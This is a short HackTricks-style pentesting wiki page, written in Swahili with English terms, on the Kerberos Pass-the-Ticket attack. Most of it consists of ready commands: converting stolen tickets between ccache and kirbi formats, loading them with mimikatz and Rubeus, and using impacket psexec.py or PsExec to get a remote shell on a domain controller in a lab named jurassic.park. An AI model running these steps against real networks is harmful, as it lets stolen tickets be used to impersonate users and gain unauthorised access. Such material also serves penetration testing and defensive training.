# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

Katika **Pass The Ticket (PTT)** attack method, attackers **huiba authentication ticket ya mtumiaji** badala ya password au hash values zake. Ticket hii iliyoibwa hutumiwa **kumuiga mtumiaji**, na hivyo kupata access isiyoidhinishwa kwa resources na services ndani ya network.<sup>[[1]](#references)</sup>

**Soma**:

- [Kuvuna tickets kutoka Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Kuvuna tickets kutoka Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Kubadilishana Linux na Windows tickets kati ya platforms**

Tool ya [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) hubadilisha ticket formats kwa kutumia ticket yenyewe na output file.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Katika Windows, [Kekeo](https://github.com/gentilkiwi/kekeo) inaweza kutumika.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Marejeo

- [1] [Kerberos (II): Jinsi ya ku-attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
